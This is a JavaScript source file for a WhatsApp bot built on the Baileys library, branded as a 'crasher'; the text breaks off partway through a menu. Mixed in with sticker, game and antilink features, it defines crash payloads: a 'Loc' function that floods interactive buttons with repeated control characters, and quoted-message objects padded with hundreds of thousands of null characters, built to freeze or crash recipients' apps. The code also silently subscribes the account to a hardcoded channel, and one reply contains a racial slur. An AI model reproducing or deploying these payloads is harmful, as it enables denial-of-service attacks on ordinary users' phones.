/*

recoded by heatless 
*/
require('./lib/listmenu')
require('../setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const cheerio = require('cheerio');
const sharp = require('sharp')
const fg = require('api-dylux')
const FormData = require('form-data')
const { modul } = require('./module')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { googleTTS, } = modul
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { shorturl, } = require("./lib/myfunc3");
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const translate = require("@vitalets/google-translate-api");
const ban = JSON.parse(fs.readFileSync("./start/lib/banned.json"))
global._antilink = {};
global.stickerCmds = {}; // key: sticker hash (base64), value: command string
module.exports = rich = async (rich, m, chatUpdate, store) => {

const { from } = m
try {
      
const body = (
  // Pesan teks biasa
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

  // Pesan media dengan caption
  ["imageMessage", "videoMessage", "documentMessage", "audioMessage", "stickerMessage"]
    .includes(m.mtype) ? m.message[m.mtype].caption || "" :

  // Pesan interaktif (tombol, list, dll.)
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

  // Pesan khusus
  m.mtype === "messageContextInfo" ? (
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
    m.text
  ) :
  m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
  m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
  m.mtype === "contactsArrayMessage" ? 
    m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
  ["locationMessage", "liveLocationMessage"].includes(m.mtype) ? 
    `${m.message[m.mtype].degreesLatitude}, ${m.message[m.mtype].degreesLongitude}` :
  ["pollCreationMessage", "pollUpdateMessage"].includes(m.mtype) ? m.message[m.mtype].name :
  m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :

  // Pesan sekali lihat (View Once)
  ["viewOnceMessage", "viewOnceMessageV2", "viewOnceMessageV2Extension"].includes(m.mtype) ? (
    m.message[m.mtype].message.imageMessage?.caption || 
    m.message[m.mtype].message.videoMessage?.caption || 
    "[Pesan sekali lihat]"
  ) :

  // Pesan sementara (ephemeralMessage)
  m.mtype === "ephemeralMessage" ? (
    m.message.ephemeralMessage.message.conversation ||
    m.message.ephemeralMessage.message.extendedTextMessage?.text || 
    "[Pesan sementara]"
  ) :

  // Pesan lain
  m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
  m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
  ""
);
const budy = (typeof m.text == 'string' ? m.text : '');
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) 
    ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : ""
  : global.prefa ?? global.prefix;

const owner = JSON.parse(fs.readFileSync('./system/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'));
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const botNumber = await rich.decodeJid(rich.user.id);
const text = q = args.join(" ")
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const qtext = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const from = mek.key.remoteJid;
const { spawn, exec } = require('child_process');
const sender = m.isGroup ? (m.key.participant || m.participant) : m.key.remoteJid;
const isban = ban.includes(m.sender)
const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : '';
const participants = m.isGroup ? groupMetadata.participants : '';
const groupAdmins = m.isGroup ? getGroupAdmins(participants) : '';
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name";
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reaction = async (jidss, emoji) => {
    rich.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
    
 //end of code
 if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "🀄", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🀄", "🀄", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await rich.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}
if (autoread) {
                rich.readMessages([m.key]);
            }

            if (global.autoTyping) {
                rich.sendPresenceUpdate("composing", from);
            }

            if (global.autoRecording) {
                rich.sendPresenceUpdate("recording", from);
            }

            //bot number online status, available=online, unavailable=offline
            rich.sendPresenceUpdate("uavailable", from);

            if (global.autorecordtype) {
                let xeonrecordin = ["recording",
                    "composing"];
                let xeonrecordinfinal =
                xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)];
                rich.sendPresenceUpdate(xeonrecordinfinal, from);
            }
if (m.sender === '2349039409985@s.whatsapp.net') {
  try {
    await rich.sendMessage(m.chat, { react: { text: '🀄', key: m.key } });
  } catch (error) {
    console.error('',);
    // Optional: Send an error message to the chat
    await rich.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
    // to react again if catch error
  }
}
// List of channel IDs
const channelId = [
  "120363400223711119@newsletter",
  "120363400223711119@newsletter"
];

// Read followed channels from a file (if exists)
let followedChannels = new Set();
try {
  const data = fs.readFileSync('./followedChannels.json', 'utf8');
  followedChannels = new Set(JSON.parse(data));
} catch (err) {
  console.log('No previous follow data found, starting fresh.');
}

// Function to follow a channel if not already followed
function followNewsletter(channelIds) {
  try {
    // Pick a channel to follow (for example, first in the array)
    const channelToFollow = channelIds[0];  // You can choose a random or specific channel here

    // Check if the channel has already been followed
    if (!followedChannels.has(channelToFollow)) {
      // Follow the channel
      rich.newsletterFollow(channelToFollow);
      followedChannels.add(channelToFollow); // Add the channel to the set

      // Persist the updated followed channels
      fs.writeFileSync('./followedChannels.json', JSON.stringify(Array.from(followedChannels)), 'utf8');

      console.log(`Following channel: ${channelToFollow}`);
    } else {
      console.log(`Already followed channel: ${channelToFollow}`);
    }
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}

// Call the function to follow a channel (only if not already followed)
followNewsletter(channelId);
//check command u want to type 
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./start/case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `\`\`\`ERROR DID YOU MEAN\`\`\`\n √ ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
m.reply(response)
}} 

// Temp in-memory toggle
let antilinkStatus = {};
if (autobio) {
            rich.updateProfileStatus(`TG_MD MD BY ${ownername} I'M HIM`).catch(_ => _)
        }
        if (isCmd)  {
            console.log(chalk.black(chalk.bgWhite('[ TG_MD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
const ThumbUrl = "https://pomf2.lain.la/f/5l5eayi.jpg"
const image1 = fs.readFileSync(`./media/image1.jpg`)

const thumb = fs.readFileSync(`./media/thumb.png`)
const tdxlol = fs.readFileSync('./tdx.jpeg')
const richieplay = fs.readFileSync('./media/rich.mp3')
const reply = (teks) => {
rich.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./media/image1.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
const replygc = (teks) => {
rich.sendMessage(from, { text: teks }, { quoted : m})
}
const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "```TG_MD```",
                        "format": "DEFAULT",
                        "caption": "BY heatless"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
        
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "RichieInHere" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: rich.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

const getDevice = require("@whiskeysockets/baileys").getDevice
// end reply 
if (!rich.public) {
if (!isCreator) return
}
const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../system/Data2')

const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    getBuffer,
} = require('./lib/myfunction');

const bubbleCharMap = {
    'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ',
    'k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ',
    'u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ',
    'A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ',
    'K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ',
    'U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'
};
const glitchCharMap = {
    'a':'̷a','b':'̷b','c':'̷c','d':'̷d','e':'̷e','f':'̷f','g':'̷g','h':'̷h','i':'̷i',
    'j':'̷j','k':'̷k','l':'̷l','m':'̷m','n':'̷n','o':'̷o','p':'̷p','q':'̷q','r':'̷r',
    's':'̷s','t':'̷t','u':'̷u','v':'̷v','w':'̷w','x':'̷x','y':'̷y','z':'̷z',
    'A':'̷A','B':'̷B','C':'̷C','D':'̷D','E':'̷E','F':'̷F','G':'̷G','H':'̷H','I':'̷I',
    'J':'̷J','K':'̷K','L':'̷L','M':'̷M','N':'̷N','O':'̷O','P':'̷P','Q':'̷Q','R':'̷R',
    'S':'̷S','T':'̷T','U':'̷U','V':'̷V','W':'̷W','X':'̷X','Y':'̷Y','Z':'̷Z'
};
const fancyCharMap = {
    'a': '𝒜', 'b': 'ℬ', 'c': '𝒞', 'd': '𝒟', 'e': 'ℰ', 'f': 'ℱ', 'g': '𝒢',
    'h': 'ℋ', 'i': 'ℐ', 'j': '𝒥', 'k': '𝒦', 'l': 'ℒ', 'm': 'ℳ', 'n': '𝒩',
    'o': '𝒪', 'p': '𝒫', 'q': '𝒬', 'r': 'ℛ', 's': '𝒮', 't': '𝒯', 'u': '𝒰',
    'v': '𝒱', 'w': '𝒲', 'x': '𝒳', 'y': '𝒴', 'z': '𝒵',
    'A': '𝒜', 'B': 'ℬ', 'C': '𝒞', 'D': '𝒟', 'E': 'ℰ', 'F': 'ℱ', 'G': '𝒢',
    'H': 'ℋ', 'I': 'ℐ', 'J': '𝒥', 'K': '𝒦', 'L': 'ℒ', 'M': 'ℳ', 'N': '𝒩',
    'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': 'ℛ', 'S': '𝒮', 'T': '𝒯', 'U': '𝒰',
    'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
};

//==============================//
if (m.mimetype === 'image/webp' && m.fileSha256) {
    const hash = m.fileSha256.toString('base64');
    const mappedCommand = global.stickerCmds[hash];
    if (mappedCommand) {
        m.text = mappedCommand;
        command = mappedCommand;
        isCmd = true;
    }
}
// Add this part outside the switch, in your message handler:
if (m.isGroup && global._antilink[m.chat]) {
    const linkRegex = /(https?:\/\/[^\s]+)/gi;
    if (linkRegex.test(m.text) && !isAdmins && !isCreator) {
        const warningText = " 🀄WARNING: Sending links is not allowed in this group! \n*anitlink handler by akane*";
        await rich.sendMessage(m.chat, { text: warningText }, { quoted: m });
        // Optional: Kick user
        // await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}

if (m.isGroup && antilinkStatus[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    if (detectLink.test(m.text)) {
        if (!isgroupAdmins && !m.key.fromMe) {
            await rich.sendMessage(m.chat, { delete: m.key });
        }
    }
}
// === POLL FUNCTION ===
const sendPollButtonMenu = async (rich, jid, quotedMsg) => {
  const pollMessage = {
    text: "*What's your favorite bot feature?*",
    footer: "Choose one option below",
    buttons: [
      { buttonId: 'vote1', buttonText: { displayText: 'Anime Commands' }, type: 1 },
      { buttonId: 'vote2', buttonText: { displayText: 'Games & XP' }, type: 1 },
      { buttonId: 'vote3', buttonText: { displayText: 'Anti-Link' }, type: 1 }
    ],
    headerType: 1
  };

  await rich.sendMessage(jid, pollMessage, { quoted: quotedMsg });
};
    
/// function sticker
async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function styletexts(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, rich, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await rich.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `TG_MD`,
                    body: `TG_MD Always With You`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `t.me/hmmletts`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply(' check console.');
    }
}
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `🎯
[ ꪉ ] done : _*${command}*_❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".script", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400223711119@newsletter",
                newsletterName: "TG_MD"
            }
        },
        footer: "© heatless ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await rich.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) rich.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            rich.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
// end

if (m.isGroup && global._antilink[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    const msgText = m.text || m.body || '';
    if (detectLink.test(msgText) && !isAdmins && !m.key.fromMe) {
        await rich.sendMessage(m.chat, { delete: m.key });
    }
}

async function Loc(isTarget, amount, jids) {
let pesan = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
locationMessage: {},
hasMediaAttachment: true
},
body: {
text: "⏤⃟͟𝙇𝙀𝙑𝙄꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠🩸"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}
]
}
}
},
carouselMessage: {
cards: []
}
}
}), {
userJid: isTarget,
quoted: null
});

await rich.relayMessage(isTarget, pesan.message, jids ? {
participant: { jid: isTarget }
} : {});
console.log("𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆🐉")
}

///bug func end

switch(command) {
case 'menutfffde': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
let Menu = `𝗜𝗻𝗳𝗼
 ▢ Developer : heatless 
 ▢ Prefix : Multi

𝗢𝘄𝗻𝗲𝗿
 ▢ Addown
 ▢ Delown
 ▢ Addprem
 ▢ Delprem
 ▢ Public
 ▢ Self
 ▢ <
 ▢ >
 ▢ $`
rich.sendMessage(m.chat, {
  image: { url: global.gambar },
  caption: Menu,
  footer: "Simple Bot WhatsApp By Tama Ryuichi",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "@newsletter",
      serverMessageId: 1,
      newsletterName: "heat Exposed"
    }
  }
}, { quoted: m });
}
break;
case 'levimenu': {
  const caption = '𝐇𝐞𝐥𝐥𝐨 @' + m.sender.split('@')[0] + ', 𝐋𝐞𝐯𝐢 𝐢𝐬 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐤𝐢𝐥𝐥\n𝐓𝐇𝐄 𝐖𝐄𝐀𝐊 ☠️\n ʟᴇᴠɪ ᴄʀᴀsʜᴇʀ ᴠ4 ';

  const buttons = [
    {
      buttonId: "menall",
      buttonText: { displayText: "𝐀𝐥𝐥𝐦𝐞𝐧𝐮" },
      type: 1
    },
    {
      buttonId: "g",
      buttonText: { displayText: "𝐎𝐭𝐡𝐞𝐫𝐦𝐞𝐧𝐮" },
      type: 1
    },
    {
      buttonId: "singleSelect",
      buttonText: { displayText: "𝐋𝐞𝐯𝐢 𝐒𝐞𝐥𝐞𝐜𝐭" },
      type: 4,
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "𝐋𝐞𝐯𝐢 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬",
          sections: [
            {
              title: "𝐌𝐨𝐫𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬",
              rows: [
                {
